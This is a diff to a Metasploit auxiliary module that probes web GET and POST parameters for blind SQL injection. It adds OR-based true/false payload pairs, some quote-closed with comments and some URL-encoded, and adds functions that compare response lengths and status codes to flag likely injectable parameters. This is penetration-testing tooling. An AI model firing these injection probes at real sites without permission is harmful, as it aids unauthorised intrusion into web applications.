@@ -68,6 +68,22 @@ class Metasploit3 < Msf::Auxiliary
 			[ 'double quotes',
 			"\" AND \"#{rnum}\"=\"#{rnum}",
 			"\" AND \"#{rnum}\"=\"#{rnum+1}"
+			],
+			[ 'OR single quotes uncommented',
+			"' OR '#{rnum}'='#{rnum}",
+			"' OR '#{rnum}'='#{rnum+1}"
+			],
+			[ 'OR single quotes closed and commented',
+			"' OR '#{rnum}'='#{rnum}'--",
+			"' OR '#{rnum}'='#{rnum+1}'--"
+			],
+			[ 'hex encoded OR single quotes uncommented',
+			"'%20OR%20'#{rnum}'%3D'#{rnum}",
+			"'%20OR%20'#{rnum}'%3D'#{rnum+1}"
+			],
+			[ 'hex encoded OR single quotes closed and commented',
+			"'%20OR%20'#{rnum}'%3D'#{rnum}'--",
+			"'%20OR%20'#{rnum}'%3D'#{rnum+1}'--"
 			]
 		]
 
@@ -98,8 +114,6 @@ class Metasploit3 < Msf::Auxiliary
 
 
 		#SEND NORMAL REQUEST
-		
-	
 		begin
 			normalres = send_request_cgi({
 				'uri'  		=> datastore['PATH'],
@@ -109,238 +123,294 @@ class Metasploit3 < Msf::Auxiliary
 				'cookie'    => datastore['COOKIE'],
 				'data'      => datastore['DATA']
 			}, 20)
-
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
 
 		sigtxt = ""
 
-		if normalres
-			if normalres.body.empty?
-				print_error("No body to obtain signature")
-				return
-			else
-				sigtxt = normalres.body
-			end
-		else
+		if not normalres
 			print_error("No response")
 			return
 		end
 
-		#print_status("Normal request sent.")
+		pinj = false	
 
 		valstr.each do |tarr|
-
 			#QUERY
 			if gvars
 				gvars.each do |key,value|
-				gvars = queryparse(datastore['QUERY']) #Now its a Hash
+					print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
 
-				print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
-
-				#SEND TRUE REQUEST
-				gvars[key] = gvars[key]+tarr[1]
-
-
-				begin
-					trueres = send_request_cgi({
-						'uri'  		=>  datastore['PATH'],
-						'vars_get' 	=>  gvars,
-						'method'   	=>  http_method,
-						'ctype'		=> 'application/x-www-form-urlencoded',
-						'cookie'    => datastore['COOKIE'],
-						'data'      => datastore['DATA']
-					}, 20)
-
-				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				rescue ::Timeout::Error, ::Errno::EPIPE
-				end
-
-				if normalres and trueres
-
-					#Very simple way to compare responses, this can be improved alot , at this time just the simple way
-
-					reltruesize = trueres.body.length-(trueres.body.scan(/#{tarr[1]}/).length*tarr[1].length)
-					normalsize = normalres.body.length
-
-					#print_status("nlen #{normalsize} reltlen #{reltruesize}")
-
-					if reltruesize == normalsize
-						#If true it means that we have a small better chance of this being a blind sql injection.
-
-						#SEND FALSE REQUEST
-						gvars[key] = gvars[key]+tarr[2]
-
-
-						begin
-							falseres = send_request_cgi({
-								'uri'  		=>  datastore['PATH'],
-								'vars_get' 	=>  gvars,
-								'method'   	=>  http_method,
-								'ctype'		=> 'application/x-www-form-urlencoded',
-								'cookie'    => datastore['COOKIE'],
-								'data'      => datastore['DATA']
-							}, 20)
-
-
-							if falseres
-								#Very simple way to compare responses, this can be improved alot , at this time just the simple way
-								relfalsesize = falseres.body.length-(falseres.body.scan(/#{tarr[2]}/).length*tarr[2].length)
-								#true_false_dist = edit_distance(falseres.body,trueres.body)
-
-								#print_status("rellenf #{relfalsesize}")
-
-								if reltruesize > relfalsesize
-									print_status("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
-
-									report_web_vuln(
-										:host	=> ip,
-										:port	=> rport,
-										:vhost  => vhost,
-										:ssl    => ssl,
-										:path	=> "#{datastore['PATH']}",
-										:method => http_method,
-										:pname  => "#{key}",
-										:proof  => "blind sql inj.",
-										:risk   => 2,
-										:confidence   => 50,
-										:category     => 'SQL injection',
-										:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
-										:name   => 'Blind SQL injection'
-									)
-								else
-									print_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
-								end
-							else
-								print_status("NO False Response.")
-							end
-
-						rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-						rescue ::Timeout::Error, ::Errno::EPIPE
-						end
-					else
-						print_status("Normal and True requests are different.")
+					#SEND TRUE REQUEST
+					testgvars = queryparse(datastore['QUERY']) #Now its a Hash
+					testgvars[key] = testgvars[key]+tarr[1]
+					begin
+						trueres = send_request_cgi({
+							'uri'  		=>  datastore['PATH'],
+							'vars_get' 	=>  testgvars,
+							'method'   	=>  http_method,
+							'ctype'		=> 'application/x-www-form-urlencoded',
+							'cookie'    => datastore['COOKIE'],
+							'data'      => datastore['DATA']
+						}, 20)
+					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+					rescue ::Timeout::Error, ::Errno::EPIPE
 					end
-				else
-					print_status("No response.")
+				
+					#SEND FALSE REQUEST
+					testgvars = queryparse(datastore['QUERY']) #Now its a Hash
+					testgvars[key] = testgvars[key]+tarr[2]
+					begin
+						falseres = send_request_cgi({
+							'uri'  		=>  datastore['PATH'],
+							'vars_get' 	=>  testgvars,
+							'method'   	=>  http_method,
+							'ctype'		=> 'application/x-www-form-urlencoded',
+							'cookie'    => datastore['COOKIE'],
+							'data'      => datastore['DATA']
+						}, 20)
+					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+					rescue ::Timeout::Error, ::Errno::EPIPE
+					end		
+	
+					pinj = detection_a(normalres,trueres,falseres,tarr)
+					
+					if pinj
+						print_error("A Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						
+						report_web_vuln(
+							:host	=> ip,
+							:port	=> rport,
+							:vhost  => vhost,
+							:ssl    => ssl,
+							:path	=> "#{datastore['PATH']}",
+							:method => http_method,
+							:pname  => "#{key}",
+							:proof  => "blind sql inj.",
+							:risk   => 2,
+							:confidence   => 50,
+							:category     => 'SQL injection',
+							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
+							:name   => 'Blind SQL injection'
+						)
+						pinj = false
+					else
+						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
+					end
+					
+					pinj = detection_b(normalres,trueres,falseres,tarr)
+					
+					if pinj
+						print_error("B Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						
+						report_web_vuln(
+							:host	=> ip,
+							:port	=> rport,
+							:vhost  => vhost,
+							:ssl    => ssl,
+							:path	=> "#{datastore['PATH']}",
+							:method => http_method,
+							:pname  => "#{key}",
+							:proof  => "blind sql inj.",
+							:risk   => 2,
+							:confidence   => 50,
+							:category     => 'SQL injection',
+							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
+							:name   => 'Blind SQL injection'
+						)
+						pinj = false
+					else
+						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
+					end
 				end
 			end
-			end
+			
 			#DATA
-
 			if pvars
 				pvars.each do |key,value|
-				pvars = queryparse(datastore['DATA']) #Now its a Hash
+					print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
 
-				print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
+					#SEND TRUE REQUEST
+					testpvars = queryparse(datastore['DATA']) #Now its a Hash
+					testpvars[key] = testpvars[key]+tarr[1]
 
-				#SEND TRUE REQUEST
-				pvars[key] = pvars[key]+tarr[1]
-
-				pvarstr = ""
-				pvars.each do |tkey,tvalue|
-					if pvarstr
-						pvarstr << '&'
+					pvarstr = ""
+					testpvars.each do |tkey,tvalue|
+						if pvarstr
+							pvarstr << '&'
+						end
+						pvarstr << tkey+'='+tvalue
 					end
-					pvarstr << tkey+'='+tvalue
-				end
 
+					begin
+						trueres = send_request_cgi({
+							'uri'  		=>  datastore['PATH'],
+							'vars_get' 	=>  gvars,
+							'method'   	=>  http_method,
+							'ctype'		=> 'application/x-www-form-urlencoded',
+							'cookie'    => datastore['COOKIE'],
+							'data'      => pvarstr
+						}, 20)
+					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+					rescue ::Timeout::Error, ::Errno::EPIPE
+					end
+					
+					#SEND FALSE REQUEST
+					testpvars = queryparse(datastore['DATA']) #Now its a Hash
+					testpvars[key] = testpvars[key]+tarr[2]
 
-				begin
-					trueres = send_request_cgi({
-						'uri'  		=>  datastore['PATH'],
-						'vars_get' 	=>  gvars,
-						'method'   	=>  http_method,
-						'ctype'		=> 'application/x-www-form-urlencoded',
-						'cookie'    => datastore['COOKIE'],
-						'data'      => pvarstr
-					}, 20)
-
-				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				rescue ::Timeout::Error, ::Errno::EPIPE
-				end
-
-				if normalres and trueres
-
-					#Very simple way to compare responses, this can be improved alot , at this time just the simple way
-
-					reltruesize = trueres.body.length-(trueres.body.scan(/#{tarr[1]}/).length*tarr[1].length)
-					normalsize = normalres.body.length
-
-					#print_status("nlen #{normalsize} reltlen #{reltruesize}")
-
-					if reltruesize == normalsize
-						#If true it means that we have a small better chance of this being a blind sql injection.
-
-						#SEND FALSE REQUEST
-						pvars[key] = pvars[key]+tarr[2]
-
-						pvarstr = ""
-						pvars.each do |tkey,tvalue|
-							if pvarstr
-								pvarstr << '&'
-							end
-							pvarstr << tkey+'='+tvalue
+					pvarstr = ""
+					testpvars.each do |tkey,tvalue|
+						if pvarstr
+							pvarstr << '&'
 						end
+						pvarstr << tkey+'='+tvalue
+					end
 
+					begin
+						falseres = send_request_cgi({
+							'uri'  		=>  datastore['PATH'],
+							'vars_get' 	=>  gvars,
+							'method'   	=>  http_method,
+							'ctype'		=> 'application/x-www-form-urlencoded',
+							'cookie'    => datastore['COOKIE'],
+							'data'      => pvarstr
+						}, 20)
+					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+					rescue ::Timeout::Error, ::Errno::EPIPE
+					end	
 
-						begin
-							falseres = send_request_cgi({
-								'uri'  		=>  datastore['PATH'],
-								'vars_get' 	=>  gvars,
-								'method'   	=>  http_method,
-								'ctype'		=> 'application/x-www-form-urlencoded',
-								'cookie'    => datastore['COOKIE'],
-								'data'      => pvarstr
-							}, 20)
-
-
-							if falseres
-								#Very simple way to compare responses, this can be improved alot , at this time just the simple way
-								relfalsesize = falseres.body.length-(falseres.body.scan(/#{tarr[2]}/).length*tarr[2].length)
-								#true_false_dist = edit_distance(falseres.body,trueres.body)
-
-								#print_status("rellenf #{relfalsesize}")
-
-								if reltruesize > relfalsesize
-									print_status("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
-
-									report_web_vuln(
-										:host	=> ip,
-										:port	=> rport,
-										:vhost  => vhost,
-										:ssl    => ssl,
-										:path	=> "#{datastore['PATH']}",
-										:method => http_method,
-										:pname  => "#{key}",
-										:proof  => "blind sql inj.",
-										:risk   => 2,
-										:confidence   => 50,
-										:category     => 'SQL injection',
-										:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
-										:name   => 'Blind SQL injection'
-									)
-
-								else
-									print_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
-								end
-							else
-								print_status("NO False Response.")
-							end
-
-						rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-						rescue ::Timeout::Error, ::Errno::EPIPE
-						end
+					pinj = detection_a(normalres,trueres,falseres,tarr)
+					
+					if pinj
+						print_error("A Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						
+						report_web_vuln(
+							:host	=> ip,
+							:port	=> rport,
+							:vhost  => vhost,
+							:ssl    => ssl,
+							:path	=> "#{datastore['PATH']}",
+							:method => http_method,
+							:pname  => "#{key}",
+							:proof  => "blind sql inj.",
+							:risk   => 2,
+							:confidence   => 50,
+							:category     => 'SQL injection',
+							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
+							:name   => 'Blind SQL injection'
+						)
+						pinj = false
 					else
-						print_status("Normal and True requests are different.")
+						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
+					end
+					
+					pinj = detection_b(normalres,trueres,falseres,tarr)
+					
+					if pinj
+						print_error("B Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+						
+						report_web_vuln(
+							:host	=> ip,
+							:port	=> rport,
+							:vhost  => vhost,
+							:ssl    => ssl,
+							:path	=> "#{datastore['PATH']}",
+							:method => http_method,
+							:pname  => "#{key}",
+							:proof  => "blind sql inj.",
+							:risk   => 2,
+							:confidence   => 50,
+							:category     => 'SQL injection',
+							:description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
+							:name   => 'Blind SQL injection'
+						)
+						pinj = false
+					else
+						vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
+					end
+				end
+			end
+		end
+	end
+	
+	def detection_a(normalr,truer,falser,tarr)
+		# print_status("A")
+			
+		# DETECTION A
+		# Very simple way to compare responses, this can be improved alot , at this time just the simple way
+		
+		if normalr and truer
+			#Very simple way to compare responses, this can be improved alot , at this time just the simple way
+			reltruesize = truer.body.length-(truer.body.scan(/#{tarr[1]}/).length*tarr[1].length)
+			normalsize = normalr.body.length
+			
+			#print_status("normalsize #{normalsize} truesize #{reltruesize}")
+			
+			if reltruesize == normalsize
+				if falser
+					relfalsesize = falser.body.length-(falser.body.scan(/#{tarr[2]}/).length*tarr[2].length)
+
+					#print_status("falsesize #{relfalsesize}")	
+					
+					if reltruesize > relfalsesize
+						return true
+					else
+						return false
 					end
 				else
-					print_status("No response.")
+					print_status("NO False Response.")
+				end
+			else
+				print_status("Normal and True requests are different.")
+			end
+		else
+			print_status("No response.")
+		end
+		
+		return false
+	end
+	
+	def detection_b(normalr,truer,falser,tarr)
+		# print_status("B")
+			
+		# DETECTION B
+		# Variance on res body
+		
+		if normalr and truer 
+			if falser
+				#print_status("N: #{normalr.body.length} T: #{truer.body.length} F: #{falser.body.length} T1: #{tarr[1].length}  F2: #{tarr[2].length} #{tarr[1].length+tarr[2].length}")
+			
+				if (truer.body.length-tarr[1].length) != normalr.body.length and (falser.body.length-tarr[2].length) == normalr.body.length
+					return true
+				end
+				if (truer.body.length-tarr[1].length) == normalr.body.length and (falser.body.length-tarr[2].length) != normalr.body.length
+					return true
 				end
 			end
-			end
-
 		end
+		
+		return false
+	end
+	
+	def detection_c(normalr,truer,falser,tarr)
+		# print_status("C")
+			
+		# DETECTION C
+		# Variance on res code of true or false statements
+		
+		if normalr and truer 
+			if falser
+				if truer.code.to_i != normalr.code.to_i and falser.code.to_i == normalr.code.to_i
+					return true
+				end
+				if truer.code.to_i == normalr.code.to_i and falser.code.to_i != normalr.code.to_i
+					return true
+				end
+			end
+		end
+		
+		return false
 	end
 end
